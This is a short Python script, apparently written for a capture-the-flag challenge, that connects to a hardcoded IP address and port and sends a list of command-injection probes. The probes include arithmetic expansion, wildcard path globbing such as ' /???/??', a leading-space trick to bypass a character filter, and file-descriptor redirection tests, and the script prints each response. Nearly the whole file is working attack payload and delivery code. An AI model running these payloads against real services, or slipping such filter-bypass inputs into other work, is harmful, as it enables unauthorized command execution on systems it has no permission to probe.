import socket
import time

HOST = '94.237.123.87'
PORT = 44123

# Payloads based on:
# - Arithmetic expansion (to try implicit command execution)
# - Wildcard probing (for guessing commands/paths)
# - Leading space bypass (to bypass character filter)
# - File descriptor redirection (to test output on higher FDs)

test_payloads = [
    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)
    " $((2+2))", 
    " $((3+2))", 
    " $((10-5))", 
    " $((6))", 
    " $((7))", 
    " $((8))", 
    " $((9))", 
    " $((10))",

    # Wildcard path guessing (with leading space)
    " /???/??", 
    " /???/???", 
    " /bin/??", 
    " /usr/??", 
    " /usr/bin/?d", 
    " /usr/bin/?s", 
    " /usr/bin/??", 
    " /b??/ls", 
    " /u??/bin/ls", 
    " /???/ls",

    # Wildcard short command guesses
    " ?s", 
    " ?d", 
    " l?", 
    " i?", 
    " id", 
    " ls", 

    # File descriptor redirection tests
    " 3>&1", " 3>&2", " 4>&1", " 4>&2",
    " 5>&1", " 5>&2", " 6>&1", " 6>&2", 
    " 7>&1", " 7>&2", " 8>&1", " 8>&2", 
    " 9>&1", " 9>&2", " 10>&1", " 10>&2",
]

def send_payload(payload):
    try:
        with socket.create_connection((HOST, PORT), timeout=3) as s:
            s.sendall(payload.encode() + b'\n')
            time.sleep(0.5)  # wait for response
            response = s.recv(4096)
            return response.decode(errors='ignore')
    except Exception as e:
        return f"[ERROR] {e}"

def main():
    for payload in test_payloads:
        print(f"\n[>>] Payload: {repr(payload)}")
        output = send_payload(payload)
        print(f"[<<] Response:\n{output}\n{'=' * 50}")

if __name__ == "__main__":
    main()
